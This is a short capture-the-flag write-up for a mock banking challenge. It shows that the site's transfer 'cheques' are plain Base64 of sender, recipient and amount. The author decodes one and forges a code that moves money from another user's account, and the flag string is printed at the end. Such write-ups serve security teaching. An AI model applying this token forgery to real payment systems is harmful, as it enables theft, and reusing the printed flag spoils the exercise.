# 01 Best Bank

The Best Bank website allows users to transfer money from your bank account to
another user's. A user fills in a form that has two fields: recipient's name
and amount to transfer (to be deducted from your bank account). After filling
in the form, you receive a code that acts as an electronic cheque the recipient
can use to receive the funds.

To receive the flag, transfer some money from Chuck Robbins' account to yours.

## Write-up

One limitation to overcome is that the system does not allow you to set a
"from" in the transfer form (for obvious reasons, it is supposed to be a bank
after all).

Issue a few transfers to see the format.

```
Transfer to tobyox from tobyox amount $1:

dG9ieW94O3RvYnlveDsx

Transfer to tobyox from tobyox amount $0:

dG9ieW94O3RvYnlveDsw

Transfer to aaaa from tobyox amount $1:

dG9ieW94O2FhYWE7MQ==
```

Clearly Base64, verify:

```
~ echo "dG9ieW94O2FhYWE7MQ==" | base64 --decode
tobyox;aaaa;1
```

So is it as easy as changing the sender and recipient...

```
~ echo "Chuck Robbins;tobyox;100" | base64
Q2h1Y2sgUm9iYmluczt0b2J5b3g7MTAwCg==
```

It worked.

```
Enter check:
Check deposited successfully. Your new balance is 501

Congratulations! Here is the flag:

D0ll4D0llAb1ll

Home
```
